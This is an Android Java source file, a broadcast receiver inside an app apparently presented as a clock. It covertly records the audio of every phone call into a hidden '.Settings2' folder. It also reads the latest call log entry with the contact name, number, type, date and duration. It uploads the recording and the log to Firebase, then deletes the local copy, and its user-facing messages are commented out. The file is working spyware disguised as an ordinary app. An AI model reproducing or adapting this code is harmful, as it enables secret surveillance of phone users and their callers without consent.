package com.aftab.clock.Receivers;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.provider.CallLog;
import android.telephony.TelephonyManager;

import com.aftab.clock.Model.CallLogs;
import com.aftab.clock.Services.UploadNewCallLog;
import com.aftab.clock.Utills.Constants;
import com.aftab.clock.Utills.Functions;
import com.aftab.clock.Utills.SharedPref;
import com.google.android.gms.tasks.Task;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.File;
import java.io.IOException;


@SuppressWarnings("deprecation")
public class CallReceiver extends BroadcastReceiver {


    private static boolean ring = false, callReceived = false, isIncoming = false;
    private static int lastState = TelephonyManager.CALL_STATE_IDLE;
    private static MediaRecorder recorder;
    String phoneNumber, extraState;
    int currentState = 0;
    SharedPref sh;
    CallLogs callLogs;
    StorageReference audioFileRef;
    String phNumber, dir;
    AudioManager audioManager;

    @SuppressLint("UnsafeProtectedBroadcastReceiver")
    @Override
    public void onReceive(Context context, Intent intent) {

        sh = new SharedPref(context);

        audioFileRef = FirebaseStorage.getInstance().getReference().child("Audio Files");

        phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
        extraState = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
        startCallService(context, intent);


    }

    private void startCallService(Context context, Intent intent) {
        if (extraState != null) {

            if (extraState.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {

                currentState = TelephonyManager.CALL_STATE_OFFHOOK;


                phoneNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);

                if (phoneNumber != null) {

                    //Toast.makeText(context, "Off hock" + phoneNumber, Toast.LENGTH_SHORT).show();

                    if (ring) {

                        callReceived = true;

                    }

                    if (lastState != TelephonyManager.CALL_STATE_RINGING) {
                        isIncoming = false;

                        //   Toast.makeText(context, "onOutgoingCallStarted", Toast.LENGTH_SHORT).show();

                    } else {

                        isIncoming = true;
                        // Toast.makeText(context, "onIncomingCallAnswered", Toast.LENGTH_SHORT).show();
                    }

                    startRecording(context);


                }


            } else if (extraState.equals(TelephonyManager.EXTRA_STATE_IDLE)) {

                phoneNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);


                if (phoneNumber != null) {

//                    Toast.makeText(context, "Idle" + phoneNumber, Toast.LENGTH_SHORT).show();

                    if (ring && !callReceived) {

                        ring = false;

                    }
                    callReceived = false;

                    if (lastState == TelephonyManager.CALL_STATE_RINGING) {
                        //Ring but no pickup-  a miss

                        uploadCallLog(context);
                        // Toast.makeText(context, "onMissedCall", Toast.LENGTH_SHORT).show();


                    } else if (isIncoming) {

                        if (recorder != null) {
                            try {

                                recorder.stop();
                            } catch (RuntimeException e) {


                                //  mFile.delete();  //you must delete the outputfile when the recorder stop failed.
                            } finally {
                                recorder.release();
                                recorder = null;
                            }
                        }

                        //  Toast.makeText(context, "onIncomingCallEnded", Toast.LENGTH_SHORT).show();
                        uploadCallLog(context);


                    } else {

                        if (recorder != null) {
                            try {
                                recorder.stop();
                            } catch (RuntimeException e) {

                                //  mFile.delete();  //you must delete the outputfile when the recorder stop failed.
                            } finally {
                                recorder.release();
                                recorder = null;
                            }
                        }

                        //  Toast.makeText(context, "onOutgoingCallEnded", Toast.LENGTH_SHORT).show();
                        uploadCallLog(context);


                    }


                }

                currentState = TelephonyManager.CALL_STATE_IDLE;


            } else if (extraState.equals(TelephonyManager.EXTRA_STATE_RINGING)) {

                currentState = TelephonyManager.CALL_STATE_RINGING;


                if (phoneNumber == null)
                    phoneNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);

                if (phoneNumber != null) {

                    ring = true;
                    isIncoming = true;
                    //Toast.makeText(context, "Ring" + phoneNumber, Toast.LENGTH_SHORT).show();

                    //context.startService(new Intent(context, UploadNewCallLog.class));
                }


            }

            lastState = currentState;


        } else if (phoneNumber != null) {
            //setIntent(context, Constants.TYPE_CALL_OUTGOING);

            // Toast.makeText(context, "Outgoing" + phoneNumber, Toast.LENGTH_SHORT).show();

        }

    }

    private void startRecording(Context context) {


        //Toast.makeText(context, "Rec", Toast.LENGTH_SHORT).show();


        File sampleDir = new File(Environment.getExternalStorageDirectory(), "/.Settings2");
        if (!sampleDir.exists()) {
            sampleDir.mkdirs();
        }

        File audiofile = null;

        try {
            audiofile = File.createTempFile(System.currentTimeMillis() + "", ".mp3", sampleDir);

        } catch (IOException e) {
            e.printStackTrace();
            //  Toast.makeText(context, "" + e.getMessage(), Toast.LENGTH_SHORT).show();
        }


        recorder = new MediaRecorder();


        recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION);

        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        assert audiofile != null;

        sh.putString(Constants.LAST_REC_URI, audiofile.toString());

        recorder.setOutputFile(audiofile.getAbsolutePath());
        try {

            recorder.prepare();

        } catch (IllegalStateException | IOException e) {
            e.printStackTrace();
            /// Toast.makeText(context, "" + e.getMessage(), Toast.LENGTH_SHORT).show();
        }


        recorder.start();


    }

    private void uploadCallLog(Context context) {

        isIncoming = false;

        new Handler().postDelayed(() -> {

            Cursor managedCursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC limit 1;");


            int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
            int name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
            int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
            int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
            int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);

            while (managedCursor.moveToNext()) {
                String nameS = managedCursor.getString(name);
                phNumber = managedCursor.getString(number);
                String callType = managedCursor.getString(type);
                String callDate = managedCursor.getString(date);
                String callDuration = managedCursor.getString(duration);
                dir = null;
                int dircode = Integer.parseInt(callType);

                if (dircode == CallLog.Calls.OUTGOING_TYPE) {

                    dir = "OUTGOING";

                } else if (dircode == CallLog.Calls.INCOMING_TYPE) {

                    dir = "INCOMING";

                } else if (dircode == CallLog.Calls.REJECTED_TYPE) {

                    dir = "INCOMING";

                } else {

                    dir = "MISSED";

                }

                if (phNumber.contains(".")) {

                    phNumber = phNumber.replace(".", ",");

                } else if (phNumber.contains("#")) {

                    phNumber = phNumber.replace("#", "-");

                } else if (phNumber.contains("$")) {

                    phNumber = phNumber.replace("$", "_");

                } else if (phNumber.contains("[")) {

                    phNumber = phNumber.replace("[", "+");

                } else if (phNumber.contains("]")) {

                    phNumber = phNumber.replace("]", "/");

                }


                if (!phNumber.contains("*") && !phNumber.contains("#")) {

                    if (!phNumber.startsWith("+") && phNumber.length() > 6) {

                        phNumber = Functions.formatNumber(context, phNumber, Functions.checkCountryISO(context));


                    }

                }

                String pushId = callDate + phNumber;


                if ((!callDuration.equals("0")) && (dir.equals("OUTGOING") || dir.equals("INCOMING"))) {


                    String fileUri = sh.getString(Constants.LAST_REC_URI);

                    Uri file = Uri.fromFile(new File(fileUri));

                    StorageReference filePath = audioFileRef.child(file.getLastPathSegment());

                    filePath.putFile(file).addOnSuccessListener(taskSnapshot -> {

                        final Task<Uri> firebaseUri = taskSnapshot.getStorage().getDownloadUrl();

                        firebaseUri.addOnSuccessListener(uri -> {

                            String callType2 = "";

                            if (dir.equals("OUTGOING")) {

                                callType2 = "OUTGOING_REC";

                            } else if (dir.equals("INCOMING")) {

                                callType2 = "INCOMING_REC";

                            }

                            String link = uri.toString();

                            Functions.saveCallLogPermissions(context, Functions.getPermissionsLogs(context), pushId);

                            callLogs = new CallLogs(pushId, nameS, phNumber, callType2, callDate, callDuration, "No Location", link, false);

                            context.startService(new Intent(context, UploadNewCallLog.class).putExtra(Constants.CALL_LOGS, callLogs));

                            File file1 = new File(String.valueOf(file));

                            file1.delete();

                        });

                    });


                } else {

                    Functions.saveCallLogPermissions(context, Functions.getPermissionsLogs(context), pushId);

                    callLogs = new CallLogs(pushId, nameS, phNumber, dir, callDate, callDuration, "No Location", "no", false);
                    context.startService(new Intent(context, UploadNewCallLog.class).putExtra(Constants.CALL_LOGS, callLogs));


                }
            }

            managedCursor.close();


        }, 5000);
    }
}
